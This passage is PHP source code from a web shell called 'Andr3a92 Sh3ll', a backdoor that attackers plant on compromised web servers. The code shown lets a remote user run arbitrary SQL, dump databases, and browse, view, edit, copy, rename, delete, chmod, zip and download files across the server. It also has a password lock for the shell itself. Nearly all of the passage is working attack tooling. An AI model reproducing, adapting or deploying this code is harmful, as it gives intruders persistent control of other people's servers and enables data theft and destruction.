						else echo htmlspecialchars($_POST['dump_table']);
						echo "\"><input type=\"hidden\" name=\"action\" value=\"connect\"><input type=\"text\" name=\"dump_file\"><br><br><input type=\"submit\" value=\"Dump\" name=\"dump\"></form>";
					}
					else dump_db_table($_COOKIE['host'],$_COOKIE['username'],$_COOKIE['password'],$_COOKIE['db'],$_POST['dump_table'],$_POST['dump_file'].".sql");
				}
				else{
					if(!isset($_POST['dump'])) echo "<form action=\"\" method=\"post\"><input type=\"hidden\" name=\"act_mysql\" value=\"dump\">Dump file name(leave blank for default!):<br><input type=\"hidden\" name=\"dir\" value=\"".$dir."\"><input type=\"text\" name=\"dump_file\"><input type=\"hidden\" name=\"action\" value=\"connect\"><br><br><input type=\"submit\" value=\"Dump\" name=\"dump\"></form>";
					else dump_db($_COOKIE['host'],$_COOKIE['username'],$_COOKIE['password'],$_COOKIE['db'],$_POST['dump_file'].".sql");
				}
			}
			else{
				if(!isset($_POST['doquery'])) echo "<form action=\"\" method=\"POST\"><input type=\"hidden\" name=\"dir\" value=\"".$dir."\"><input type=\"hidden\" name=\"action\" value=\"connect\"><input type=\"hidden\" name=\"act_mysql\" value=\"makequery\">SQL code:<br><br><textarea rows=\"10\" cols=\"77\" name=\"eval\"></textarea><br><br><input type=\"submit\" value=\"Execute query\" name=\"doquery\"></form>";
				else{
					if(mysql_connect($_COOKIE['host'],$_COOKIE['username'],$_COOKIE['password'])){
						if(mysql_select_db($_COOKIE['db'])){
							if($strip_all) $query = stripslashes($_POST['eval']);
							else $query = $_POST['eval'];
							if(mysql_query($query)) echo '<font color="green">Query executed!</font>';
							else echo '<font color="red">'.mysql_error().'</font>';
							mysql_close();
						}
						else{
							mysql_close();
							echo "<font color=\"red\">An error occurted! Could not select the database called ".htmlspecialchars($_COOKIE['db'])."!</font>";
							setcookie("username","",time() - 3600);
							setcookie("password","",time() - 3600);
							setcookie("host","",time() - 3600);
							setcookie("db","",time() - 3600);
						}
					}
					else{
						mysql_close();
						echo "<font color=\"red\">An error occurted! Could not select the database called ".htmlspecialchars($_COOKIE['db'])."!</font>";
						setcookie("username","",time() - 3600);
						setcookie("password","",time() - 3600);
						setcookie("host","",time() - 3600);
						setcookie("db","",time() - 3600);
					}
				}
			}
			echo '</center><br>&nbsp;</td></tr></table>';
		}
	}
}
// To create an archive
elseif($action == "zip"){
	if(isset($_POST['zip_dir'])){
		if(!isset($_POST['zip'])) echo "<tr><td bgcolor=\"#CCCCCC\"><br><center><form action=\"\" method=\"POST\"><input type=\"hidden\" name=\"zip_dir\" value=\"".htmlspecialchars($_POST['zip_dir'])."\"><input type=\"hidden\" name=\"dir\" value=\"".$dir."\"><input type=\"hidden\" name=\"action\" value=\"zip\">Archive name:<br><input type=\"text\" name=\"archivename\"><br><br><input type=\"submit\" value=\"Create\" name=\"zip\"></form></center></td></tr>";
		else{
			echo "<tr><td bgcolor=\"#CCCCCC\"><br><center>";
			if(create_zip($_POST['archivename'].".zip",$_POST['zip_dir'])) echo "<font color=\"green\">Zip archive '".$name_zip."' created successfull!</font>";
			else{
				echo "<font color=\"green\">Zip archive '".$name_zip."' created with some errors!</font><br>"; 
				for($a = 0; $a < count($zip_error); $a++) echo "<font color=\"red\">".$zip_error[$a]."</font><br>";
			}
			echo "<br>&nbsp;</center></td></tr>";
		}
	}
	else{
		echo '<tr><td bgcolor="#CCCCCC">';
		if(!isset($_POST['zip'])){
			$__dir = array();
			$__file = array();
			foreach(glob("*") as $f){
				if(is_dir($f)) $__dir[] = $f;
				else $__file[] = $f;
			}
			echo '<br><center><form action="'.$shell.'" name="checkboxform" method="POST"><input type="hidden" name="dir" value="'.$dir.'"><input type="hidden" name="action" value="zip">Archive name:<br><input type="text" name="archivename"><br><input type="checkbox" name="check1" onclick="checkalldir('.count($__dir).')">All Dir&nbsp;&nbsp;<input type="checkbox" name="check2" onclick="checkallfile('.count($__file).')">All File&nbsp;&nbsp;<input type="checkbox" name="check3" onclick="checkall('.count($__dir).','.count($__file).')">All&nbsp;&nbsp;<input type="checkbox" name="check4" onclick="invertall('.count($__dir).','.count($__file).')">Invert selection<br><br><table id="checkbox">';
			for($a = 0; $a < count($__dir); $a++) echo '<tr><td width="16"><input type="checkbox" name="dir__'.$a.'" value="'.$__dir[$a].'" onclick="checkone('.count($__dir).','.count($__file).')"></td><td width="16"><img src="'.$shell.'?img=dir" border="0"></td><td>'.$__dir[$a].'</td></tr>';
			for($a = 0; $a < count($__file); $a++) echo '<tr><td width="16"><input type="checkbox" name="file__'.$a.'" value="'.$__file[$a].'" onclick="checkone('.count($__dir).','.count($__file).')"></td><td width="16"><img src="'.$shell.'?img=file" border="0"></td><td>'.$__file[$a].'</td></tr>';
			echo '</table><input type="submit" value="Create" name="zip"></form>';
		}
		else{
			$__dir = array();
			$__file = array();
			foreach($_POST as $k=>$v){
				if(eregi("dir__",$k)) $__dir[] = $v;
				elseif(eregi("file__",$k)) $__file[] = $v;
			}
			for($a = 0; $a < count($__dir); $a++) PackDir($__dir[$a]);
			for($a = 0; $a < count($__file); $a++) addFile($__file[$a]);
			$file = gen_filename($_POST['archivename'].".zip");
			$fp = fopen($file,'x+');
			fwrite($fp,gen_file());
			fclose($fp);
			if($zip_error[0] != ""){
				echo "<font color=\"green\">Zip archive '".$file."' created with some errors!</font><br>"; 
				for($a = 0; $a < count($zip_error); $a++) echo "<font color=\"red\">".$zip_error[$a]."</font><br>";
			}
			else echo "<font color=\"green\">Zip archive '".$file."' created successfull!</font>";
		}
		echo '<br>&nbsp;</td></tr></table>';
	}
}

//To delete a file
if($filedelete != ""){
	if(!isset($_POST['confirm'])){
		echo "<form action=\"\" method=\"POST\" name=\"confirm\"><input type=\"hidden\" name=\"filedelete\" value=\"".$filedelete."\"><input type=\"hidden\" name=\"confirm\" value=\"ok\"><input type=\"hidden\" name=\"filedelete\" value=\"".$filedelete."\"><input type=\"hidden\" name=\"dir\" value=\"".$dir."\"></form><script language=\"javascript\">
		var answer = confirm (\"Are you sure to delete file '".$filedelete."'?\")
		if(answer) document.confirm.submit()
		</script>";
	}
	else{
		echo "<tr><td bgcolor=\"#CCCCCC\"><br><center>";
		if(unlink($filedelete)) echo "<br><font color=\"green\">File ".$filedelete." deleted succesfull!</font>";
		else echo "<br><font color=\"red\">Error!<br>The file ".$filedelete." cannot be deleted!<br>Maybe you don't have persmissions for delete this file!</font>";
		echo "<br>&nbsp;</tr></tr>";	
	}
}

// To lock this file
if($_POST['lockaction'] == "lock"){
	echo '<tr><td bgcolor="#CCCCCC"><br><center>';
	if(!isset($_POST['username']) && !isset($_POST['password'])) echo "<form action=\"\" method=\"POST\" name=\"lock\"><input type=\"hidden\" name=\"lockaction\" value=\"lock\">Username: <input type=\"text\" name=\"username\"><br>Password: <input type=\"password\" name=\"password\"><br><input type=\"submit\" value=\"Lock\"></form><br>&nbsp;</td></tr>";
	else{
		$file_cont = "";
		for($a = 0; $a < 10; $a++) $file_cont .= md5(md5(rand(0,10000000))).'::::'.md5(md5(rand(10000001,2000000)))."\n";
		$file_cont .= md5(md5(strtolower($_POST['username'])).'andr3a92').'::::'.md5(md5($_POST['password']).'andr3a92')."\n";
		$file_cont .= md5(md5(rand(0,10000000))).'::::'.md5(md5(rand(10000001,2000000)));
		chdir($shell_location);
		$fp = fopen(md5('andr3a92'),"a+");
		if($fp){
			if(fwrite($fp,$file_cont)) echo '<font color="green">Protection ENABLED!</font>';
			else echo '<font color="red">Could not create protection file!</font>';
		}
		else echo '<font color="red">Could not create protection file!</font>';
		fclose($fp);
		echo '<br>&nbsp;';
	}
	echo '</center></td></tr>';
}

// To logout from shell if protection is enabled
if($_POST['logout'] == 1 && is_file($shell_location."/".md5('andr3a92'))){
	setcookie("shell_username","",time() - 3600,"/");
	setcookie("shell_password","",time() - 3600,"/");
	header("location: ".$shell);
}

// To unlock this file
if($_POST['lockaction'] == "unlock"){
	echo '<tr><td bgcolor="#CCCCCC"><br><center>';
	chdir($shell_location);
	if(unlink(md5('andr3a92'))) echo '<font color="green">Protection DISABLED!</font>';
	else echo '<font color="red">Could not delete protection file!</font>';
	echo '</center><br>&nbsp;</td></tr>';
}
	
//To delete a directory
if($dirdelete != ""){
	if(!isset($_POST['confirm'])){
		echo "<form action=\"\" method=\"POST\" name=\"confirm\"><input type=\"hidden\" name=\"dirdelete\" value=\"".$dirdelete."\"><input type=\"hidden\" name=\"confirm\" value=\"ok\"><input type=\"hidden\" name=\"dir\" value=\"".$dir."\"></form>
		<script language=\"javascript\">
		var answer = confirm (\"Are you sure to delete directory '".$dirdelete."'?\")
		if(answer) document.confirm.submit()
		</script>";
	}
	else{
		echo "<tr><td bgcolor=\"#CCCCCC\"><br><center>";
		rmdirr($dirdelete);
		if(!is_dir($dirdelete)) echo "<br><font color=\"green\">Directory ".$dirdelete." deleted succesfull!</font>";
		elseif(is_dir($dirdelete)) echo "<br><font color=\"red\">Error!<br>The directory ".$dirdelete." cannot be deleted!<br>Maybe you don't have persmissions for delete this directory!</font>";
		echo "<br>&nbsp;</td></tr>";	
	}
}

//To edit a file
if($fileedit != ""){
	if(isset($_POST['editfile'])){
		if($strip_all) $to_edit = stripslashes($_POST['edit']);
		else $to_edit = $_POST['edit'];
		$fp = fopen($fileedit , "w+");
		fwrite($fp , $to_edit);
		fclose($fp);
		echo "<tr><td bgcolor=\"#CCCCCC\"><br><center><font color=\"green\">File edit succesfull!</font><br>&nbsp;</font></center></td></tr></table><br>";
	}
	elseif(!isset($_POST['editfile'])){
		if(is_writable($fileedit)){
			$file_ = htmlspecialchars(join(file($fileedit)));
			echo "<tr><td bgcolor=\"#CCCCCC\"><br><center><form action=\"\" method=\"POST\"><input type=\"hidden\" name=\"dir\" value=\"".$dir."\"><input type=\"hidden\" name=\"fileedit\" value=\"".$fileedit."\"><textarea name=\"edit\" rows=\"30\" cols=\"77\">".$file_."</textarea><br><br><input type=\"submit\" value=\"Edit\" name=\"editfile\"></form></center><br>&nbsp;</tr></tr>";
		}
		else echo "<tr><td bgcolor=\"#CCCCCC\"><br><center><font color=\"red\">Error!<br>This file cannot be edited!</font><br>&nbsp;</center></td></tr>";
	}
}

//To open a file
if($fileopen != ""){
	$file_source = htmlentities(join(file($fileopen)));
	echo "<tr><td bgcolor=\"#CCCCCC\"><br><center><textarea rows=\"30\" cols=\"77\">".$file_source."</textarea><br>&nbsp;</center></td></tr>";
}

//To rename a file
if($filerename != ""){
	if(file_exists($filerename) AND is_file($filerename) AND !isset($_POST['rename'])) echo "<tr><td bgcolor=\"#CCCCCC\"><br><center>Include format in the new name of this file!<br><br>Old name: ".$filerename."<br><br><form action=\"\" method=\"POST\"><input type=\"hidden\" name=\"dir\" value=\"".$dir."\"><input type=\"hidden\" name=\"filerename\" value=\"".$filerename."\">New name:<br><input type=\"text\" name=\"filerename2\"><br><br><input type=\"submit\" value=\"Rename\" name=\"rename\"></form></center><br>&nbsp;</td></tr>";
	elseif(isset($_POST['rename']) AND file_exists($filerename) AND is_file($filerename) AND !is_file($_POST['filerename2'])){
		if(rename($filerename , htmlspecialchars($_POST['filerename2']))) echo "<tr><td bgcolor=\"#CCCCCC\"><br><center><font color=\"green\">File ".$filerename." renamed ".htmlspecialchars($_POST['filerename2'])."</center><br>&nbsp;</tr></tr>";
		else echo "<tr><td bgcolor=\"#CCCCCC\"><br><center><font color=\"red\">Error!<br>This file cannot be renamed!</font><br>&nbsp;</center></td></tr>";
	}
}

//To rename a directory
if($dirrename != ""){
	if(is_dir($dirrename) AND !isset($_POST['drename'])) echo "<tr><td bgcolor=\"#CCCCCC\"><br><center><form action=\"\" method=\"POST\"><input type=\"hidden\" name=\"dir\" value=\"".$dir."\"><input type=\"hidden\" name=\"dirrename\" value=\"".$dirrename."\">Old name: ".$dirrename."<br>New name:<br><input type=\"text\" name=\"dirrename2\"><br><br><input type=\"submit\" value=\"Rename\" name=\"drename\"></form></center><br>&nbsp;</td></tr>";
	elseif(isset($_POST['drename']) AND is_dir($dirrename) AND !is_dir($_POST['dirrename2'])){
		if(rename($dirrename , htmlspecialchars($_POST['dirrename2']))) echo "<tr><td bgcolor=\"#CCCCCC\"><br><center><font color=\"green\">Directory ".$dirrename." renamed ".htmlspecialchars($_POST['dirrename2'])."</center><br>&nbsp;</tr></tr>";
		else echo "<tr><td bgcolor=\"#CCCCCC\"><br><center><font color=\"red\">Error!<br>This directory cannot be renamed!</font><br>&nbsp;</center></td></tr>";
	}
}

// To copy a file
if($filecopy != ""){
	if(is_file($filecopy) AND !isset($_POST['fpaste']))	echo "<tr><td bgcolor=\"#CCCCCC\"><br><center><form action=\"\" method=\"POST\">New name:<br><input type=\"text\" name=\"filepaste\"><input type=\"hidden\" name=\"dir\" value=\"".$dir."\"><input type=\"hidden\" name=\"filecopy\" value=\"".$filecopy."\"><br><br><input type=\"submit\" value=\"Copy\" name=\"fpaste\"></form></center><br>&nbsp;</td></tr>";
	elseif(isset($_POST['fpaste']) AND is_file($filecopy) AND !is_file($_POST['filepaste'])){
		if(copy($filecopy, htmlspecialchars($_POST['filepaste']))) echo "<tr><td bgcolor=\"#CCCCCC\"><br><center><font color=\"green\">File ".$filecopy." pasted as ".htmlspecialchars($_POST['filepaste'])."</center><br>&nbsp;</tr></tr>";
		else echo "<tr><td bgcolor=\"#CCCCCC\"><br><center><font color=\"red\">Error!<br>This file cannot be pasted!</font><br>&nbsp;</center></td></tr>";
	}
}

// to chmod a file
if($chmod != ""){
	if(!isset($_POST['ch_mod']) && (is_file($chmod) || is_dir($chmod))){
		$c = getperms($chmod);
		echo $c[2];
		if($c[0] == "r") $owner_read = 'checked = ""';
		if($c[1] == "w") $owner_write = 'checked = ""';
		if($c[2] == "x") $owner_execute = 'checked = ""';
		if($c[3] == "r") $group_read = 'checked = ""';
		if($c[4] == "w") $group_write = 'checked = ""';
		if($c[5] == "x") $group_execute = 'checked = ""';
		if($c[6] == "r") $other_read = 'checked = ""';
		if($c[7] == "w") $other_write = 'checked = ""';
		if($c[8] == "x") $other_execute = 'checked = ""';
		$num = substr(sprintf('%o', fileperms($chmod)), -4);
		echo "<tr><td bgcolor=\"#CCCCCC\"><font color=\"red\">User</font></td><td bgcolor=\"#CCCCCC\"><font color=\"red\">Read</font></td><td bgcolor=\"#CCCCCC\"><font color=\"red\">Write</font></td><td bgcolor=\"#CCCCCC\"><font color=\"red\">Execute</font></td></tr>
		<form action=\"\" method=\"POST\" name=\"chmod\"><input type=\"hidden\" name=\"dir\" value=\"".$dir."\"><input type=\"hidden\" name=\"chmod\" value=\"".$chmod."\">
		<input name=\"h_owner\" type=\"hidden\" value=\"".$num[1]."\">
		<input name=\"h_group\" type=\"hidden\" value=\"".$num[2]."\">
		<input name=\"h_other\" type=\"hidden\" value=\"".$num[3]."\">
		<tr><td bgcolor=\"#CCCCCC\"><font color=\"red\">Owner</font></td><td bgcolor=\"#CCCCCC\"><font color=\"red\"><input type=\"checkbox\" name=\"owner4\" value=\"4\" onclick=\"calculator('owner', 4)\" ".$owner_read."></font></td><td bgcolor=\"#CCCCCC\"><font color=\"red\"><input type=\"checkbox\" name=\"owner2\" value=\"2\" onclick=\"calculator('owner', 2)\" ".$owner_write."></font></td><td bgcolor=\"#CCCCCC\"><font color=\"red\"><input type=\"checkbox\" name=\"owner1\" value=\"1\" onclick=\"calculator('owner', 1)\" ".$owner_execute."></font></td></tr>
		<tr><td bgcolor=\"#CCCCCC\"><font color=\"red\">Group</font></td><td bgcolor=\"#CCCCCC\"><font color=\"red\"><input type=\"checkbox\" name=\"group4\" value=\"4\" onclick=\"calculator('group', 4)\" ".$group_read."></font></td><td bgcolor=\"#CCCCCC\"><font color=\"red\"><input type=\"checkbox\" name=\"group2\" value=\"2\" onclick=\"calculator('group', 2)\" ".$group_write."></font></td><td bgcolor=\"#CCCCCC\"><font color=\"red\"><input type=\"checkbox\" name=\"group1\" value=\"1\" onclick=\"calculator('group', 1)\" ".$group_execute."></font></td></tr>
		<tr><td bgcolor=\"#CCCCCC\"><font color=\"red\">Other</font></td><td bgcolor=\"#CCCCCC\"><font color=\"red\"><input type=\"checkbox\" name=\"other4\" value=\"4\" onclick=\"calculator('other', 4)\" ".$other_read."></font></td><td bgcolor=\"#CCCCCC\"><font color=\"red\"><input type=\"checkbox\" name=\"other2\" value=\"2\" onclick=\"calculator('other', 2)\" ".$other_write."></font></td><td bgcolor=\"#CCCCCC\"><font color=\"red\"><input type=\"checkbox\" name=\"other1\" value=\"1\" onclick=\"calculator('other', 1)\" ".$other_execute."></font></td></tr></table>
		<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tr><td bgcolor=\"#CCCCCC\">Chmod value:  <input type=\"text\" name=\"t_owner\" value=\"".$num[1]."\" size=\"1\"><input type=\"text\" name=\"t_group\" value=\"".$num[2]."\" size=\"1\"><input type=\"text\" name=\"t_other\" value=\"".$num[3]."\" size=\"1\"> &nbsp;&nbsp;<input type=\"submit\" value=\"Chmod\" name=\"ch_mod\"></form></td></tr>";
	}
	elseif(isset($_POST['ch_mod']) && (is_file($chmod) || is_dir($chmod))){
		$ch_mod = "0".(int)$_POST['t_owner']."".(int)$_POST['t_group']."".(int)$_POST['t_other'];
		if(chmod($chmod,$ch_mod)) echo "<tr><td bgcolor=\"#CCCCCC\"><br><center><font color=\"green\">File ".$chmod." chmodded on ".$ch_mod."</center><br>&nbsp;</tr></tr>";
		else echo "<tr><td bgcolor=\"#CCCCCC\"><br><center><font color=\"red\">Error!<br>This file cannot be chmodded! Maybe you don't have permissions!</font><br>&nbsp;</center></td></tr>";
	}
}
echo "</table><br><table border=\"0\" cellpadding=\"0\" cellspacing=\"0\">
<tr><td bgcolor=\"black\"><center><font size=\"3\" color=\"#00ff00\">Andr3a92 Sh3ll ~ Files</font></center></td></tr>
</table>
<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tr>
<td bgcolor=\"#CCCCCC\"><center><table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" id=\"cd\"><tr><td>|&nbsp;</td><td><form action=\"\" method=\"POST\" name=\"previousdir\"><input type=\"hidden\" name=\"dir\" value=\"";
if(eregi("/",$dir)) echo $dir."/..";
else echo $dir."\..";
echo "\"><a href=\"#\" onclick=\"document.previousdir.submit()\">Previous Directory</a></form></td><td>|&nbsp;</td><td><form action=\"\" method=\"POST\" name=\"principaldir\"><input type=\"hidden\" name=\"dir\" value=\"";
if(eregi("/",$dir)) echo "/";
else echo "\\";
echo "\"><a href=\"#\" onclick=\"document.principaldir.submit()\">Principal directory</a></form></td><td>|&nbsp;</td><td>";
echo "<form action=\"\" method=\"POST\" name=\"homepath\"><input type=\"hidden\" name=\"dir\" value=\"".$shell_location."\"><a href=\"#\" onclick=\"document.homepath.submit()\">Home Folder</a></form></td><td>|</td></tr></table></center></td></tr></table>
<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\">
<tr><td bgcolor=\"#CCCCCC\">&nbsp;</td><td bgcolor=\"#CCCCCC\"><font color=\"red\">Name</font></td><td bgcolor=\"#CCCCCC\"><font color=\"red\">Go / View</font></td><td bgcolor=\"#CCCCCC\"><font color=\"red\">Size</font></td><td bgcolor=\"#CCCCCC\"><font color=\"red\">Permissions</font></td><td bgcolor=\"#CCCCCC\"><font color=\"red\">Actions</font></td></tr>
";

//Shows all files
$dirs = array();
$files = array();

foreach (glob("*") as $contents){
	if($dir != ""){
		if(is_file($contents)){
			if(strpos($dir,"/") !== FALSE) $files[] = $dir."/".$contents;
			elseif(strpos($dir,"\\") !== FALSE) $files[] = $dir."\\".$contents;
		}
		elseif(is_dir($contents)){
			if(strpos($dir,"/") !== FALSE) $dirs[] = $dir."/".$contents;
			elseif(strpos($dir,"\\") !== FALSE) $dirs[] = $dir."\\".$contents;
		}
	}
	else{
		if(is_file($contents)) $files[] = $contents;
		elseif(is_dir($contents)) $dirs[] = $contents;
	}
}

for($a = 0; $a < count($dirs); $a++){
	if(strpos($dirs[$a],"/") !== FALSE){
		$dir_name = explode("/",$dirs[$a]);
		$dir_name = $dir_name[count($dir_name) - 1];
	}
	elseif(strpos($dirs[$a],"\\") !== FALSE){
		$dir_name = explode("\\",$dirs[$a]);
		$dir_name = $dir_name[count($dir_name) - 1];
	}
	else $dir_name = $dirs[$a];
	$permission = getperms($dir_name);
	if(eregi($_SERVER['DOCUMENT_ROOT'],$dirs[$a])){
		$tmp_a = explode($_SERVER['DOCUMENT_ROOT'],$dirs[$a]);
		$dirz = $tmp_a[1];
	}
	echo "<tr><td bgcolor=\"#CCCCCC\"><center><img src=\"".$shell."?img=dir\" border=\"0\"></center></td><td bgcolor=\"#CCCCCC\"><a href=\"".$dirz."\" target=\"_BLANK\">".$dir_name."</a></td><td bgcolor=\"#CCCCCC\"><form action=\"\" method=\"POST\" name=\"dir_".$a."\"><input type=\"hidden\" name=\"dir\" value=\"".getcwd();
	if(strpos(getcwd(),"\\") !== FALSE) echo "\\";
	else echo "/";
	echo $dir_name."\"><a href=\"#\" onclick=\"document.dir_".$a.".submit()\">Go</a></form></td><td bgcolor=\"#CCCCCC\">&nbsp;--- </td><td bgcolor=\"#CCCCCC\">".$permission."</td><td bgcolor=\"#CCCCCC\" align=\"right\"><table id=\"actionsdir\" cellpadding=\"0\" cellspacing=\"0\">
	<td><form action=\"\" method=\"POST\" name=\"dirrename".$a."\"><input type=\"hidden\" name=\"dir\" value=\"".$dir."\"><input type=\"hidden\" name=\"dirrename\" value=\"".$dir_name."\"><a href=\"#\" onclick=\"document.dirrename".$a.".submit()\"><img src=\"".$shell."?img=rename\" border=\"0\" title=\"Rename\"></a></form></td>
	<td><form action=\"\" method=\"POST\" name=\"dirdelete".$a."\"><input type=\"hidden\" name=\"dir\" value=\"".$dir."\"><input type=\"hidden\" name=\"dirdelete\" value=\"".$dir_name."\"><a href=\"#\" onclick=\"document.dirdelete".$a.".submit()\"><img src=\"".$shell."?img=delete\" border=\"0\" title=\"Delete\"></a></form></td>
	<td><form action=\"\" method=\"POST\" name=\"dirchmod".$a."\"><input type=\"hidden\" name=\"dir\" value=\"".$dir."\"><input type=\"hidden\" name=\"chmod\" value=\"".$dir_name."\"><a href=\"#\" onclick=\"document.dirchmod".$a.".submit()\"><img src=\"".$shell."?img=chmod\" border=\"0\" title=\"Chmod\"></a></form></td>
	<td><form action=\"\" method=\"POST\" name=\"zipdir".$a."\"><input type=\"hidden\" name=\"dir\" value=\"".$dir."\"><input type=\"hidden\" name=\"action\" value=\"zip\"><input type=\"hidden\" name=\"zip_dir\" value=\"".$dir_name."\"><a href=\"#\" onclick=\"document.zipdir".$a.".submit()\"><img src=\"".$shell."?img=zip\" border=\"0\" title=\"Zip\"></a></form></td></tr></table></td></tr>";
}

for($a = 0; $a < count($files); $a++){
	if(strpos($files[$a],"/") !== FALSE){
		$file_name = explode("/",$files[$a]);
		$file_name = $file_name[count($file_name) - 1];
	}
	elseif(strpos($files[$a],"\\") !== FALSE){
		$file_name = explode("\\",$files[$a]);
		$file_name = $file_name[count($file_name) - 1];
	}
	else $file_name = $files[$a];
	$permission = getperms($file_name);
	if(eregi($_SERVER['DOCUMENT_ROOT'],$files[$a])){
		$tmp_a = explode($_SERVER['DOCUMENT_ROOT'],$files[$a]);
		$filez = $tmp_a[1];
	}
	else $filez = $files[$a];
	echo "<tr><td bgcolor=\"#CCCCCC\"><center><img src=\"".$shell."?img=file\" border=\"0\"></center></td><td bgcolor=\"#CCCCCC\"><a href=\"".$filez."\" target=\"_BLANK\">".$file_name."</a></td>
	<td bgcolor=\"#CCCCCC\"><form action=\"\" method=\"POST\" name=\"open".$a."\"><input type=\"hidden\" name=\"dir\" value=\"".$dir."\"><input type=\"hidden\" name=\"fileopen\" value=\"".$file_name."\"><a href=\"#\" onclick=\"document.open".$a.".submit()\">View</a></form></td>
	<td bgcolor=\"#CCCCCC\">".totalsize($file_name)."</td>
	<td bgcolor=\"#CCCCCC\">".$permission."</td>
	<td bgcolor=\"#CCCCCC\" align=\"right\"><table id=\"actions\" cellpadding=\"0\" cellspacing=\"0\"><tr><td><form action=\"\" method=\"POST\" name=\"edit".$a."\"><input type=\"hidden\" name=\"dir\" value=\"".$dir."\"><input type=\"hidden\" name=\"fileedit\" value=\"".$file_name."\"><a href=\"#\" onclick=\"document.edit".$a.".submit()\"><img src=\"".$shell."?img=edit\" border=\"0\" title=\"Edit\"></a></form></td>
	<td><form action=\"\" method=\"POST\" name=\"filecopy".$a."\"><input type=\"hidden\" name=\"dir\" value=\"".$dir."\"><input type=\"hidden\" name=\"filecopy\" value=\"".$file_name."\"><a href=\"#\" onclick=\"document.filecopy".$a.".submit()\"><img src=\"".$shell."?img=copy\" border=\"0\" title=\"Copy\"></a></form></td>
	<td><form action=\"\" method=\"POST\" name=\"filerename".$a."\"><input type=\"hidden\" name=\"dir\" value=\"".$dir."\"><input type=\"hidden\" name=\"filerename\" value=\"".$file_name."\"><a href=\"#\" onclick=\"document.filerename".$a.".submit()\"><img src=\"".$shell."?img=rename\" border=\"0\" title=\"Rename\"></a></form></td>
	<td><form action=\"\" method=\"POST\" name=\"filedelete".$a."\"><input type=\"hidden\" name=\"dir\" value=\"".$dir."\"><input type=\"hidden\" name=\"filedelete\" value=\"".$file_name."\"><a href=\"#\" onclick=\"document.filedelete".$a.".submit()\"><img src=\"".$shell."?img=delete\" border=\"0\" title=\"Delete\"></a></form></td>
	<td><form action=\"\" method=\"POST\" name=\"chmod".$a."\"><input type=\"hidden\" name=\"dir\" value=\"".$dir."\"><input type=\"hidden\" name=\"chmod\" value=\"".$file_name."\"><a href=\"#\" onclick=\"document.chmod".$a.".submit()\"><img src=\"".$shell."?img=chmod\" border=\"0\" title=\"Chmod\"></a></form></td>
	<td><form action=\"\" method=\"POST\" name=\"download".$a."\"><input type=\"hidden\" name=\"download\" value=\"".getcwd()."/".$file_name."\"><a href=\"#\" onclick=\"document.download".$a.".submit()\"><img src=\"".$shell."?img=download\" border=\"0\" title=\"Download\"></a></form>
	</td></tr></table></td></tr>";
}
echo "</table><br>";
?>
</body>
</head>
</html>